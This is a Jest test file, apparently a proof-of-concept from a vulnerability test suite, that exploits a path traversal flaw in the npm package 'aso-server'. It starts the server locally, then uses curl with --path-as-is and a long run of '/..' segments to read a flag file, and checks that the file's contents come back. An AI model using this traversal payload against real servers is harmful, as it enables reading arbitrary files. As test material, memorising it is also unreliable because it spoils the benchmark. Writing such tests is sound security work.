const path = require('path');
const pathToFlag = path.resolve(__dirname, '../flag.html');
const genstr = function (n) {
    const v24 = '/..'.repeat(50);
    const v25 = v24 + pathToFlag;
    return v25;
};
const v45 = done => {
    const v26 = expect.assertions(1);
    v26;
    var pkg = require('aso-server');
    const fs = require('fs');
    const v27 = require('sleep');
    const sleep = v27.sleep;
    const v28 = require('child_process');
    const exec = v28.exec;
    const v29 = fs.readFileSync(pathToFlag);
    let hostsFile = v29.toString();
    const a = require('child_process');
    try {
        const v30 = () => {
        };
        const v31 = a.execSync('fuser -k 3000/tcp', v30);
        v31;
    } catch (e) {
    }
    const v33 = e => {
        const v32 = console.log(e);
        return v32;
    };
    const v34 = pkg.onError(v33);
    const v35 = () => {
    };
    const v36 = v34.onStop(v35);
    const v37 = srv => {
    };
    let server = v36.start('localhost', 3000, v37);
    const v38 = sleep(2);
    v38;
    const v39 = genstr();
    let attack_string = `curl -v --path-as-is "http://127.0.0.1:3000/f/${ v39 }"`;
    const v43 = (error, stdout) => {
        const v40 = expect(stdout);
        const v41 = v40.toBe(hostsFile);
        v41;
        const v42 = done();
        v42;
    };
    const v44 = exec(attack_string, v43);
    v44;
};
const v46 = test('Path Traversal in aso-server', v45);
v46;